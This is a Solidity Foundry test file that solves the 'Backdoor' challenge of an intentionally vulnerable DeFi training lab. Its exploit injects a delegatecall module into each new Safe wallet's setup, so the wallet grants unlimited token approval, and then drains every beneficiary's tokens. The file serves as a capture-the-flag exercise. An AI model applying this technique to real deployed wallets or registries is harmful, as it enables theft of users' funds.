// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

/**
 * A simple contract that can be used via delegatecall in Safe::setup(...)
 * to make the Safe call token.approve(spender, max).
 * NOTE: This function executes in the context (storage) of the calling Safe.
 */
contract BackdoorModule {
    function approveToken(address token, address spender) external {
        DamnValuableToken(token).approve(spender, type(uint256).max);
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [
        makeAddr("alice"),
        makeAddr("bob"),
        makeAddr("charlie"),
        makeAddr("david")
    ];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy Safe master copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(singletonCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Transfer tokens to the registry which will fund newly-created Safes
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(
            token.balanceOf(address(walletRegistry)),
            AMOUNT_TOKENS_DISTRIBUTED
        );

        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // Non-owner users can't add new beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()` from the registry
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * The exploit: deploy one contract call from 'player' that:
     *  1) Deploys a BackdoorModule (the code to be delegatecalled).
     *  2) For each user in `users`:
     *     a) Encode a "setup(...)" call that includes a delegatecall to `BackdoorModule.approveToken(...)`.
     *     b) Create a new Safe proxy for that user via SafeProxyFactory.createProxyWithCallback(...),
     *        pointing `walletRegistry` as the callback.
     *     c) The registry's `proxyCreated()` will send tokens to the new Safe.
     *     d) We already forced the new Safe (via delegatecall) to `approve()` our contract
     *        for unlimited spending.
     *     e) We transferFrom() all tokens from the new Safe to `recovery`.
     */
    function test_backdoor() public checkSolvedByPlayer {
        // The player is now msg.sender in this context
        // Deploy a module that we can delegatecall into from each Safe
        BackdoorModule attackerModule = new BackdoorModule();

        // For each user, create a new Safe proxy with a malicious setup
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];

            // We'll pass this callData to Safe::setup(...):
            // The "to" in the Safe's setup is `address(attackerModule)`,
            // and "data" is the encoded call to `approveToken(token, address(this))`.
            // Because the Safe will `delegatecall` into the "to" address with "data",
            // it will run "approveToken" in the Safe's storage context, effectively
            // calling `DVT.approve(..., unlimited)` from the Safe's address.
            bytes memory delegateCallData = abi.encodeWithSelector(
                BackdoorModule.approveToken.selector,
                address(token), // token
                address(this) // spender => this contract
            );

            // Gnosis Safe's `setup(address[] memory _owners, uint256 _threshold, address to, bytes memory data,
            //  address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)`
            // We'll do a single-owner Safe with threshold=1, no fallbackHandler, no payment
            address owners = user;

            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners, // _owners
                1, // _threshold
                address(attackerModule), // to (the contract to delegatecall)
                delegateCallData, // data
                address(0), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );

            // Create the new proxy, which calls WalletRegistry.proxyCreated(...)
            // after the Gnosis Safe constructor finishes.
            // That, in turn, funds the Safe with 10 tokens (since 40 total across 4 users).
            address newSafe = address(
                walletFactory.createProxyWithCallback(
                    address(singletonCopy),
                    initializer,
                    0,
                    walletRegistry
                )
            );

            // Now that the newSafe has tokens and has `approve(this, type(uint256).max)`,
            // we can transfer them out to 'recovery'.
            uint256 safeBalance = token.balanceOf(newSafe);
            if (safeBalance > 0) {
                token.transferFrom(newSafe, recovery, safeBalance);
            }
        }
    }

    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);
            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");
            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
